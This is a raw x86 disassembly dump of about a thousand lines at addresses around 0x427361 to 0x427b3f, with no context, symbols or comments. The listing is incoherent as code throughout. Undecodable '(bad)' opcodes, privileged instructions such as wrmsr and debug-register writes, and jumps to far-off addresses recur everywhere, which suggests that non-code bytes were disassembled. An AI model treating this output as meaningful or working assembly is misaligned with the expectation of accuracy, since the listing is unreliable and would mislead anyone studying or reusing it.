  427361:	inc    ebp
  427362:	(bad)  
  427363:	lea    edi,[eax+edi*2-0x1]
  427367:	inc    edi
  427369:	mov    DWORD PTR ds:0x8000c7a0,edi
  42736f:	mov    ebp,esi
  427371:	cld    
  427372:	in     al,0x8d
  427374:	inc    ebp
  427375:	(bad)  
  427376:	call   0xc7cb537a
  42737b:	add    DWORD PTR [eax-0x11ba1500],ecx
  427381:	inc    DWORD PTR [ebp-0x4]
  427384:	out    0x8d,eax
  427386:	aas    
  427387:	(bad)  
  427388:	call   0xca9e8c
  42738d:	add    DWORD PTR [ebx-0x7f570400],ecx
  427393:	add    BYTE PTR [ecx],al
  427395:	test   DWORD PTR [eax],eax
  427397:	wrmsr  
  427399:	jae    0x427388
  42739b:	add    BYTE PTR [eax],al
  42739d:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4273a3:	add    esp,edi
  4273a5:	add    BYTE PTR [eax+0x450108],al
  4273ab:	mov    edi,DWORD PTR [ebp-0x6c]
  4273ae:	add    DWORD PTR [eax],0x4
  4273b1:	mov    eax,DWORD PTR [ebp+0x3]
  4273b4:	mov    edi,DWORD PTR [esp+edi*8]
  4273b7:	dec    ebp
  4273b8:	nop
  4273b9:	mov    eax,DWORD PTR [ecx]
  4273bb:	fadd   DWORD PTR [eax]
  4273bd:	add    BYTE PTR [esi],al
  4273bf:	lea    eax,[eax]
  4273c1:	pusha  
  4273c2:	push   eax
  4273c3:	inc    DWORD PTR [ebp+0x52]
  4273c6:	call   DWORD PTR [ebp-0x7b]
  4273c9:	mov    esi,DWORD PTR [ebp-0x74]
  4273cc:	mov    eax,DWORD PTR [eax]
  4273ce:	cld    
  4273cf:	mov    eax,DWORD PTR [eax+0x880103]
  4273d5:	add    BYTE PTR [ebp+0x6a],bh
  4273d8:	cmp    edi,0x10
  4273db:	mov    WORD PTR [ebp+0x0],es
  4273de:	mov    edx,DWORD PTR [edx-0x4]
  4273e1:	push   ecx
  4273e2:	nop
  4273e3:	inc    DWORD PTR [ecx]
  4273e5:	cld    
  4273e6:	add    BYTE PTR [ebp-0x24],bh
  4273e9:	mov    eax,DWORD PTR [eax]
  4273eb:	cld    
  4273ec:	push   eax
  4273ed:	nop
  4273ee:	inc    ebp
  4273ef:	add    edi,edi
  4273f1:	add    BYTE PTR [ebx+0x4de4f445],cl
  4273f7:	in     al,dx
  4273f8:	xor    eax,edi
  4273fa:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  427401:	mov    DWORD PTR [eax],0xb8788b98
  427407:	test   ebx,eax
  427409:	jmp    FWORD PTR [eax-0x1]
  42740c:	int    0xed
  42740e:	sub    esp,eax
  427410:	add    eax,DWORD PTR [ebp-0x30]
  427413:	fild   WORD PTR [ebp+0x3f]
  427416:	cmp    eax,edi
  427418:	je     0xca43543a
  42741e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  427425:	(bad)  
  427426:	jne    0x4273b4
  427428:	mov    ebx,ebp
  42742a:	cld    
  42742b:	js     0x427472
  42742d:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  427433:	inc    ebp
  427434:	call   0xea9dc4
  427439:	add    BYTE PTR [ebx-0x7f170301],cl
  42743f:	add    DWORD PTR es:[eax],eax
  427442:	add    al,al
  427444:	xor    BYTE PTR [eax+0x41],dl
  427447:	inc    ebp
  427448:	add    BYTE PTR [ebx+0xfcd88b],cl
  42744e:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  427454:	add    DWORD PTR [ecx+0x458be845],ecx
  42745a:	fmul   DWORD PTR [ebx+0x8bb800]
  427460:	cld    
  427461:	call   0xd79f26
  427466:	dec    DWORD PTR [ebx+0x1090e8ff]
  42746c:	add    al,al
  42746e:	push   eax
  42746f:	es inc ebp
  427471:	inc    ebp
  427472:	mov    ecx,DWORD PTR [ebx+0xd89c]
  427478:	dec    DWORD PTR [ebx-0x3ff70301]
  42747e:	mov    DWORD PTR gs:[eax],eax
  427481:	call   0x8b6aba46
  427486:	inc    ebp
  427487:	mov    eax,0xe8d8008b
  42748c:	add    BYTE PTR [ecx],ch
  42748e:	mov    eax,DWORD PTR [eax]
  427490:	cld    
  427491:	mov    eax,eax
  427493:	call   0x462a84ed
  427498:	sub    DWORD PTR [ebx-0x3c743000],ecx
  42749e:	cld    
  42749f:	mov    BYTE PTR [eax+0x8401c1],0x1
  4274a6:	xor    BYTE PTR [eax],al
  4274a8:	push   edi
  4274a9:	inc    ebp
  4274aa:	mov    DWORD PTR [ebx],esi
  4274ac:	in     al,0xb9
  4274ae:	inc    ebp
  4274af:	lea    ecx,[ebx-0x3c370301]
  4274b5:	dec    ebp
  4274b6:	cwde   
  4274b7:	mov    esi,DWORD PTR [edx]
  4274b9:	or     BYTE PTR [ebx],al
  4274bb:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4274c2:	call   0x429e0c
  4274c7:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4274cd:	jge    0x427502
  4274cf:	mov    eax,DWORD PTR [ebx]
  4274d1:	cld    
  4274d2:	lea    edx,[eax+0xff0120]
  4274d8:	call   0x429e6c
  4274dd:	push   eax
  4274de:	inc    DWORD PTR [ebp-0x1c]
  4274e1:	mov    ecx,DWORD PTR [ebp-0x58]
  4274e4:	xor    eax,DWORD PTR [eax]
  4274e6:	add    edi,edi
  4274e8:	cmp    ebp,eax
  4274ea:	jne    0x427512
  4274ec:	mov    DWORD PTR [eax],0x8b004dd8
  4274f2:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4274f9:	mov    eax,ebx
  4274fb:	cld    
  4274fc:	test   BYTE PTR [eax+0x320198],bh
  427502:	mov    DWORD PTR [ebp+0x8],esi
  427505:	xor    eax,DWORD PTR [ebp-0x73]
  427508:	test   DWORD PTR [esp+esi*2-0x1],edi
  42750c:	mov    ebp,eax
  42750e:	mov    eax,0x33004d29
  427513:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427519:	add    DWORD PTR [eax],eax
  42751b:	add    BYTE PTR [ebp+0x30],al
  42751e:	mov    edx,DWORD PTR [edi-0x48]
  427521:	add    ebx,0xffffffe4
  427524:	push   0x2b74cd85
  427529:	mov    eax,DWORD PTR [ebx]
  42752b:	cld    
  42752c:	sar    BYTE PTR [eax+0x3b0145],1
  427532:	pcmpeqw mm4,mm6
  427535:	xor    edi,edi
  427537:	lea    ecx,[ebx-0x239c7470]
  42753d:	add    BYTE PTR [ebp+0x50],cl
  427540:	cmp    eax,DWORD PTR [ebp+0x75]
  427543:	mov    ebp,DWORD PTR [eax-0x68]
  427546:	test   DWORD PTR [eax],eax
  427548:	clc    
  427549:	push   DWORD PTR [ebp-0x1]
  42754c:	lea    ecx,[eax]
  42754e:	int3   
  42754f:	inc    ebp
  427550:	call   0xfaa5e0
  427555:	jne    0x42754f
  427557:	xor    edi,DWORD PTR [ebp-0x41]
  42755a:	jmp    0x4275ce
  42755c:	mov    eax,DWORD PTR [eax]
  42755e:	mov    eax,0x339545c7
  427563:	inc    DWORD PTR [ebx]
  427565:	push   DWORD PTR [ecx]
  427567:	aaa    
  427568:	mov    eax,DWORD PTR [eax]
  42756a:	jmp    0x4275bc
  42756c:	mov    eax,DWORD PTR [ebp-0x3c]
  42756f:	mov    eax,eax
  427571:	cld    
  427572:	clc    
  427573:	ret    
  427574:	test   bh,al
  427576:	pop    es
  427577:	xchg   ebp,eax
  427578:	add    bh,bh
  42757a:	inc    ebp
  42757b:	dec    DWORD PTR [edi]
  42757d:	and    DWORD PTR [ebx],ebp
  42757f:	add    BYTE PTR [eax],al
  427581:	push   eax
  427582:	jbe    0x4275d9
  427584:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  42758a:	or     al,0xcf
  42758c:	inc    eax
  42758d:	enter  0x745,0x72
  427591:	inc    ebp
  427592:	mov    eax,DWORD PTR [ecx]
  427594:	int3   
  427595:	add    BYTE PTR [ebp-0x75],al
  427598:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  42759e:	ror    BYTE PTR [ebp+0x72f80885],1
  4275a4:	inc    ebp
  4275a5:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4275ab:	fadd   st,st(6)
  4275ad:	rol    BYTE PTR [ebp+0x12],0x8b
  4275b1:	inc    ebp
  4275b2:	fmul   QWORD PTR [ebx-0x3c39233d]
  4275b8:	inc    ebp
  4275b9:	test   bh,al
  4275bb:	cwde   
  4275bc:	clc    
  4275bd:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4275c3:	inc    ebp
  4275c4:	cmp    dh,BYTE PTR [ebx]
  4275c6:	pushf  
  4275c7:	mov    ecx,0xffb48dc7
  4275cc:	test   eax,ecx
  4275ce:	clc    
  4275cf:	dec    ebp
  4275d0:	inc    ebp
  4275d1:	mov    edi,DWORD PTR [eax+ecx*1]
  4275d4:	pushf  
  4275d5:	rol    edi,0x86
  4275d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275d9:	inc    BYTE PTR [ebp+0x45f7f8ff]
  4275df:	inc    ebp
  4275e0:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  4275e8:	test   DWORD PTR [eax],edi
  4275ea:	clc    
  4275eb:	pushf  
  4275ec:	inc    ebp
  4275ed:	dec    DWORD PTR [ebx-0x3cba0f04]
  4275f3:	push   eax
  4275f4:	(bad)  
  4275f5:	cld    
  4275f6:	jge    0x4275f8
  4275f8:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4275fe:	add    BYTE PTR [ebx],dl
  427600:	jmp    0xcd7752
  427605:	les    eax,FWORD PTR [ebp-0x35]
  427608:	mov    ecx,esi
  42760a:	lock or al,cl
  42760d:	clc    
  42760e:	inc    ebp
  42760f:	add    esi,DWORD PTR [ebx]
  427611:	jge    0x427616
  427613:	xor    edi,DWORD PTR [ebx]
  427615:	cmp    ecx,DWORD PTR [edi]
  427617:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42761c:	mov    edi,DWORD PTR [ecx]
  42761e:	test   al,0xcc
  427620:	dec    ebp
  427621:	test   BYTE PTR [ebx],dh
  427623:	pop    es
  427624:	xor    eax,DWORD PTR [eax]
  427626:	add    ecx,DWORD PTR [esi]
  427628:	add    ecx,eax
  42762a:	psraw  mm0,mm1
  42762d:	sub    BYTE PTR [ebp+0x38],cl
  427630:	mov    edi,DWORD PTR [ebx]
  427632:	lock int3 
  427634:	shl    edx,1
  427636:	rol    BYTE PTR [ebp+0xc],1
  427639:	mov    DWORD PTR [ebp-0x24],0xf8038533
  427640:	jmp    0x7b768a
  427645:	pushf  
  427646:	inc    ebp
  427647:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  42764d:	xor    ecx,ebx
  42764f:	add    ecx,esi
  427651:	mov    esi,eax
  427653:	enter  0x45af,0x8b
  427657:	xor    ecx,eax
  427659:	add    edx,DWORD PTR [ebp-0x77]
  42765c:	sub    ecx,DWORD PTR [eax]
  42765e:	cmp    eax,DWORD PTR [ebp+0x77]
  427661:	fmul   DWORD PTR [ebx-0x76385764]
  427667:	test   al,0x0
  427669:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  42766f:	cmp    esi,DWORD PTR [ebx]
  427671:	pushf  
  427672:	xor    eax,edi
  427674:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  42767b:	inc    ebp
  42767c:	dec    ebp
  42767d:	cmp    eax,0xc7f09c8b
  427682:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  427689:	inc    ebp
  42768a:	jmp    0x4276cb
  42768c:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  427693:	dec    ebp
  427694:	xor    esi,DWORD PTR [ebx]
  427696:	add    eax,DWORD PTR [ebx]
  427698:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  42769e:	dec    ebp
  42769f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4276a5:	out    dx,eax
  4276a6:	rol    BYTE PTR [eax],1
  4276a8:	add    eax,0xebc8458b
  4276ad:	dec    ebp
  4276ae:	mov    ebp,DWORD PTR [ebx]
  4276b0:	mov    esp,0x33f84d8b
  4276b5:	ret    
  4276b6:	xor    eax,esi
  4276b8:	add    ecx,eax
  4276ba:	add    eax,DWORD PTR [edx+0xc1010f]
  4276c0:	dec    ebp
  4276c1:	inc    ebp
  4276c2:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4276c8:	ror    bl,1
  4276ca:	add    eax,0xebc645ce
  4276cf:	scas   eax,DWORD PTR es:[edi]
  4276d0:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4276d6:	xor    ebp,DWORD PTR [ebx]
  4276d8:	xor    edi,DWORD PTR [ebx]
  4276da:	add    esi,DWORD PTR [edi+0x3]
  4276dd:	mov    ecx,DWORD PTR [edi]
  4276df:	clc    
  4276e0:	rol    ebx,0x4d
  4276e3:	(bad)  
  4276e4:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4276eb:	mov    ah,0x45
  4276ed:	dec    ebp
  4276ee:	jbe    0x427723
  4276f0:	mov    esi,DWORD PTR [ebx]
  4276f2:	call   0x3345c3fa
  4276f7:	rdpmc  
  4276f9:	rol    DWORD PTR [ebx],0x4d
  4276fc:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427702:	inc    ebp
  427703:	ror    BYTE PTR [ebx+0x45450808],1
  427709:	jmp    0x10a7799
  42770e:	inc    ebp
  42770f:	inc    ebp
  427710:	(bad)  
  427711:	mov    ebx,eax
  427713:	clc    
  427714:	test   ebx,eax
  427716:	clc    
  427717:	retf   
  427718:	inc    ebp
  427719:	into   
  42771a:	mov    esi,0x8b85afec
  427720:	clc    
  427721:	enter  0x5545,0x3a
  427725:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  42772c:	ret    
  42772d:	mov    ah,0xc6
  42772f:	addr16 push 0x338b4545
  427735:	clc    
  427736:	add    eax,ebx
  427738:	loopne 0x427705
  42773a:	dec    ebp
  42773b:	into   
  42773c:	mov    al,dh
  42773e:	or     BYTE PTR [edi-0x37ff748e],ch
  427744:	inc    ebp
  427745:	push   ebp
  427746:	mov    ebp,DWORD PTR [ebx]
  427748:	in     al,dx
  427749:	cmp    eax,ebx
  42774b:	ja     0x427792
  42774d:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  427753:	inc    ebp
  427754:	cwde   
  427755:	mov    esi,DWORD PTR [edx]
  427757:	clc    
  427758:	mov    bl,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	retf   
  42775c:	inc    ebp
  42775d:	into   
  42775e:	mov    eax,esi
  427760:	in     al,dx
  427761:	scas   eax,DWORD PTR es:[edi]
  427762:	retf   
  427763:	mov    ecx,DWORD PTR [ebp-0x38]
  427766:	mov    edx,DWORD PTR [ebp-0x24]
  427769:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  427770:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  427777:	mov    eax,DWORD PTR [ebx]
  427779:	clc    
  42777a:	loopne 0x42773f
  42777c:	push   ebp
  42777d:	retf   
  42777e:	mov    dh,al
  427780:	adc    esi,ecx
  427782:	jb     0x427733
  427784:	add    BYTE PTR [ebx+0x558bc845],cl
  42778a:	in     al,dx
  42778b:	sub    eax,ebx
  42778d:	cmp    ecx,ebx
  42778f:	mov    eax,esi
  427791:	mov    esp,0x45af03ce
  427796:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  42779c:	mov    eax,ebx
  42779e:	in     al,dx
  42779f:	into   
  4277a0:	dec    ebp
  4277a1:	(bad)  
  4277a2:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4277a8:	rol    DWORD PTR [ebp+0x4d],0x89
  4277ac:	xor    esp,esp
  4277ae:	sub    eax,DWORD PTR [ebp-0x75]
  4277b1:	add    ebp,esp
  4277b3:	mov    al,0x55
  4277b5:	inc    ebp
  4277b6:	xor    edi,DWORD PTR [eax]
  4277b8:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4277bf:	inc    ebp
  4277c0:	xor    edi,DWORD PTR [ecx]
  4277c2:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4277c9:	test   DWORD PTR [eax],eax
  4277cb:	clc    
  4277cc:	enter  0x8645,0x33
  4277d0:	inc    DWORD PTR [ebx]
  4277d2:	(bad)  
  4277d3:	jmp    0x42781a
  4277d5:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4277db:	inc    ebp
  4277dc:	(bad)  
  4277dd:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4277e3:	cwde   
  4277e4:	retf   
  4277e5:	xor    al,cl
  4277e7:	mov    BYTE PTR [ebp+0xb],cl
  4277ea:	lea    eax,[ebp+0x8]
  4277ed:	xor    esi,DWORD PTR [edx+0x3]
  4277f0:	add    al,ah
  4277f2:	inc    ebp
  4277f3:	dec    ebp
  4277f4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4277fa:	push   0x2b45cd00
  4277ff:	mov    al,BYTE PTR [ebx]
  427801:	or     esi,eax
  427803:	dec    ebp
  427804:	inc    ebp
  427805:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  42780b:	push   ebp
  42780c:	(bad)  
  42780d:	mov    BYTE PTR [edi+0xf723b11],ch
  427813:	add    ch,ch
  427815:	inc    ebp
  427816:	dec    DWORD PTR [ebx-0x34332775]
  42781c:	add    al,0x4d
  42781e:	inc    ebp
  42781f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  427825:	cwde   
  427826:	add    DWORD PTR [edx],esi
  427828:	add    BYTE PTR [ebx+0x4d00c000],cl
  42782e:	push   DWORD PTR [ebx]
  427830:	int3   
  427831:	xor    eax,DWORD PTR [eax]
  427833:	add    edx,DWORD PTR [eax+0x3]
  427836:	mov    DWORD PTR [edi],ecx
  427838:	call   0x428838fe
  42783d:	mov    DWORD PTR [ebp-0x20],esp
  427840:	add    BYTE PTR [ebp+0x7d],al
  427843:	mov    eax,DWORD PTR [eax]
  427845:	in     al,0x15
  427847:	ret    
  427848:	iret   
  427849:	(bad)  
  42784a:	enter  0x14af,0x8b
  42784e:	(bad)  
  42784f:	in     al,dx
  427850:	or     bl,cl
  427852:	adc    cl,al
  427854:	push   ebp
  427855:	dec    ebp
  427856:	inc    eax
  427857:	mov    edx,DWORD PTR [ebp-0x20]
  42785a:	jb     0x427827
  42785c:	mov    ecx,esi
  42785e:	cld    
  42785f:	scas   eax,DWORD PTR es:[edi]
  427860:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  427867:	mov    BYTE PTR [eax],0x8c
  42786a:	push   0xffffff98
  42786c:	push   edi
  42786d:	xor    dl,BYTE PTR [eax+0x3b]
  427870:	mov    ecx,DWORD PTR [edi]
  427872:	call   0x8c41bdd5
  427877:	mov    eax,eax
  427879:	in     al,dx
  42787a:	jge    0x4278c9
  42787c:	mov    DWORD PTR [ebx],esi
  42787e:	int3   
  42787f:	add    eax,DWORD PTR [ebp+0xf]
  427882:	xor    eax,ecx
  427884:	(bad)  
  427885:	dec    ebp
  427886:	pushf  
  427887:	xor    ecx,eax
  427889:	add    edi,DWORD PTR [edi]
  42788b:	mov    eax,DWORD PTR [ebp-0x38]
  42788e:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  427895:	mov    DWORD PTR [edx+0xf4505c8],ecx
  42789b:	xor    edx,DWORD PTR [ecx+edi*4]
  42789e:	or     BYTE PTR [ebp-0x371600bd],0xf
  4278a5:	dec    ebp
  4278a6:	leave  
  4278a7:	mov    edx,ecx
  4278a9:	rol    BYTE PTR [ebp+0x330155],1
  4278af:	add    ecx,DWORD PTR [ebp+0xf]
  4278b2:	xor    eax,edx
  4278b4:	(bad)  
  4278b5:	ror    DWORD PTR [eax],0x86
  4278b8:	jb     0x4278b7
  4278ba:	add    bh,bh
  4278bc:	clc    
  4278bd:	inc    ebp
  4278be:	jb     0x42792a
  4278c0:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4278c6:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  4278cc:	shr    BYTE PTR [eax-0x3d],0x30
  4278d0:	clc    
  4278d1:	add    BYTE PTR [ebp+0x75],al
  4278d4:	cmp    BYTE PTR [edx-0x64],ch
  4278d7:	inc    edi
  4278d9:	adc    al,0xe8
  4278db:	inc    ebp
  4278dc:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4278e2:	mov    ecx,DWORD PTR [eax]
  4278e4:	cld    
  4278e5:	or     DWORD PTR [ebp-0x34],0x33
  4278e9:	jbe    0x4278ee
  4278eb:	mov    edx,DWORD PTR [ecx+0x2b]
  4278ee:	dec    ebp
  4278ef:	mov    cl,BYTE PTR [ebx+0x45d801]
  4278f5:	mov    BYTE PTR [ebx],dh
  4278f7:	mov    eax,DWORD PTR [ebx]
  4278f9:	or     BYTE PTR [ecx+0x3b],dl
  4278fc:	dec    ebp
  4278fd:	int3   
  4278fe:	xor    ebp,edi
  427900:	add    eax,DWORD PTR [ebp+0x51]
  427903:	mov    ecx,DWORD PTR [ebp-0x28]
  427906:	xor    eax,DWORD PTR [eax]
  427908:	add    ebp,DWORD PTR [eax+0x51]
  42790b:	adc    BYTE PTR [eax+0x0],0x8b
  42790f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427915:	inc    ebp
  427916:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42791c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  427922:	dec    ebp
  427923:	mov    esi,DWORD PTR [ebx]
  427925:	hlt    
  427926:	add    eax,ebx
  427928:	push   ecx
  427929:	inc    ebp
  42792a:	dec    ebp
  42792b:	sar    bh,1
  42792d:	shl    ah,1
  42792f:	(bad)  
  427930:	retf   
  427931:	mov    al,ds:0xc5ff3dce
  427936:	adc    al,0xc6
  427938:	inc    ebp
  427939:	and    eax,0x9c0f4c85
  42793e:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  427945:	cmp    BYTE PTR [ebx+0x3b],0x0
  427949:	mov    dh,0xc7
  42794b:	cmp    eax,eax
  42794d:	jne    0x45437199
  427953:	mov    edi,DWORD PTR [edx]
  427955:	mov    eax,0x848bcb9c
  42795a:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  427961:	or     BYTE PTR [edi],cl
  427963:	(bad)  
  427964:	dec    ebp
  427965:	inc    edi
  427966:	add    bh,0x50
  427969:	or     cl,ch
  42796b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  427971:	xchg   DWORD PTR [eax-0x1638af64],eax
  427977:	mov    esp,0xf802b588
  42797c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42797d:	inc    ebp
  42797e:	(bad)  
  42797f:	cmp    al,0xff
  427981:	pushf  
  427982:	or     DWORD PTR [ecx+0x45ffe474],0x0
  427989:	mov    ecx,DWORD PTR [ebp-0x340018]
  42798f:	into   
  427990:	dec    DWORD PTR [ebx-0x7f72431c]
  427996:	push   0x5000ff01
  42799b:	retf   
  42799c:	inc    ebp
  42799d:	into   
  42799e:	dec    DWORD PTR [ebx-0x343f3ff4]
  4279a4:	push   eax
  4279a5:	into   
  4279a6:	call   0x4a7e36
  4279ab:	retf   
  4279ac:	add    dh,cl
  4279ae:	add    bh,bh
  4279b0:	mov    DWORD PTR [eax+ecx*1],edx
  4279b3:	clc    
  4279b4:	inc    ebp
  4279b5:	inc    ebp
  4279b6:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4279bc:	push   0x1
  4279be:	push   edi
  4279bf:	add    BYTE PTR [eax-0x35],dl
  4279c2:	mov    ecx,esi
  4279c4:	cld    
  4279c5:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4279cb:	into   
  4279cc:	ror    BYTE PTR [ebx+0x75000800],0x50
  4279d3:	xor    eax,DWORD PTR [ebp+0x3]
  4279d6:	jne    0x427a29
  4279d8:	call   DWORD PTR [eax-0x3c]
  4279db:	mov    DWORD PTR [ecx-0x18],edx
  4279de:	mov    edi,edi
  4279e0:	call   0x8b45bf69
  4279e5:	add    ah,ah
  4279e7:	rol    BYTE PTR [ebp-0x7c],0xeb
  4279eb:	add    edi,edi
  4279ed:	add    al,ch
  4279ef:	inc    ebp
  4279f0:	push   ecx
  4279f1:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  4279f7:	mov    al,0xc7
  4279f9:	test   esp,esp
  4279fb:	clc    
  4279fc:	test   DWORD PTR [ebp-0x8],ecx
  4279ff:	add    BYTE PTR [ebp+0x50],0x39
  427a03:	jmp    0x8bcc02a4
  427a08:	in     al,dx
  427a09:	or     BYTE PTR [ebp-0xf],al
  427a0c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427a12:	hlt    
  427a13:	mov    eax,DWORD PTR [ebp-0x50]
  427a16:	xor    esi,ecx
  427a18:	add    eax,DWORD PTR [eax+0x4f086889]
  427a1e:	inc    ebp
  427a1f:	sbb    eax,0x68
  427a22:	pushf  
  427a23:	inc    edi
  427a25:	add    al,ch
  427a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a28:	test   edi,edi
  427a2a:	clc    
  427a2b:	inc    DWORD PTR [ebp-0x73]
  427a2e:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  427a32:	(bad)  
  427a33:	push   ecx
  427a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a35:	jne    0x4279bc
  427a37:	push   eax
  427a38:	clc    
  427a39:	test   DWORD PTR [ebp-0x1],eax
  427a3c:	cmp    eax,0xc78b9cff
  427a41:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  427a48:	inc    ebp
  427a49:	push   edi
  427a4a:	aas    
  427a4b:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  427a52:	dec    ebp
  427a53:	add    BYTE PTR [ebx],dh
  427a55:	inc    ebp
  427a56:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  427a5c:	enter  0x8401,0x0
  427a60:	add    al,BYTE PTR [eax]
  427a62:	add    bh,bh
  427a64:	out    dx,eax
  427a65:	sbb    BYTE PTR [eax],al
  427a67:	dec    ebp
  427a68:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  427a6e:	sub    esi,DWORD PTR [ebx]
  427a70:	mov    ebp,DWORD PTR [eax-0x8]
  427a73:	add    bl,0x0
  427a76:	(bad)  
  427a77:	cmp    eax,ecx
  427a79:	or     BYTE PTR [edx+0x750114],al
  427a7f:	inc    DWORD PTR [ebp+0x18]
  427a82:	mov    eax,DWORD PTR [ebp-0x8]
  427a85:	mov    ebx,eax
  427a87:	(bad)  
  427a88:	retf   
  427a89:	inc    ebp
  427a8a:	into   
  427a8b:	mov    esi,eax
  427a8d:	int3   
  427a8e:	scas   eax,DWORD PTR es:[edi]
  427a8f:	push   es
  427a90:	mov    esi,DWORD PTR [ebp-0xc]
  427a93:	call   DWORD PTR [ebp+0x18]
  427a96:	sub    edi,DWORD PTR [ebp+0x3b]
  427a99:	mov    esi,DWORD PTR [edi-0x34]
  427a9c:	mov    eax,DWORD PTR [ebp-0x8]
  427a9f:	cmp    bl,al
  427aa1:	pushf  
  427aa2:	mov    bh,0xbc
  427aa5:	fadd   QWORD PTR [eax]
  427aa7:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  427aad:	mov    esi,DWORD PTR [ebx]
  427aaf:	in     al,0x33
  427ab1:	ret    
  427ab2:	add    eax,esi
  427ab4:	add    eax,DWORD PTR [ebp+0xf]
  427ab7:	mov    eax,ecx
  427ab9:	in     al,0x4d
  427abb:	ret    
  427abc:	mov    eax,esi
  427abe:	in     al,dx
  427abf:	inc    ebp
  427ac0:	rol    edi,1
  427ac2:	sar    al,1
  427ac4:	or     BYTE PTR [ebp+0x45e9f845],al
  427aca:	add    BYTE PTR [edx],bh
  427acc:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427ad3:	test   ebx,eax
  427ad5:	clc    
  427ad6:	retf   
  427ad7:	inc    ebp
  427ad8:	into   
  427ad9:	cmp    al,0xc6
  427adb:	pushf  
  427adc:	scas   eax,DWORD PTR es:[edi]
  427add:	(bad)  
  427ade:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427ae5:	inc    ebp
  427ae6:	cmp    edi,DWORD PTR [esi]
  427ae8:	ja     0x427a86
  427aea:	mov    eax,edi
  427aec:	mov    esp,0x458567a8
  427af1:	clc    
  427af2:	mov    eax,DWORD PTR [ebp-0x8]
  427af5:	mov    eax,ebx
  427af7:	in     al,dx
  427af8:	retf   
  427af9:	ret    
  427afa:	into   
  427afb:	mov    dh,0x7d
  427afe:	scas   eax,DWORD PTR es:[edi]
  427aff:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427b05:	add    BYTE PTR [ebx],ch
  427b07:	jmp    0xb97c47
  427b0c:	mov    eax,DWORD PTR [ebp-0x5c]
  427b0f:	mov    eax,DWORD PTR [ebp-0x14]
  427b12:	inc    ebp
  427b13:	enter  0x458b,0xf8
  427b17:	xor    eax,ebx
  427b19:	add    ecx,ebx
  427b1b:	cmp    ecx,esi
  427b1d:	shufps xmm7,xmm4,0xaf
  427b21:	add    BYTE PTR [ebx+0x55e8f48b],cl
  427b27:	dec    ebp
  427b28:	sub    esi,DWORD PTR [ebx]
  427b2a:	cmp    esi,DWORD PTR [ebx]
  427b2c:	ja     0x427b31
  427b2e:	mov    eax,DWORD PTR [ebx]
  427b30:	lods   al,BYTE PTR ds:[esi]
  427b31:	mov    db0,ecx
  427b34:	inc    ebp
  427b35:	dec    ebp
  427b36:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  427b3c:	retf   
  427b3d:	rol    dh,1
  427b3f:	or     al,0xce
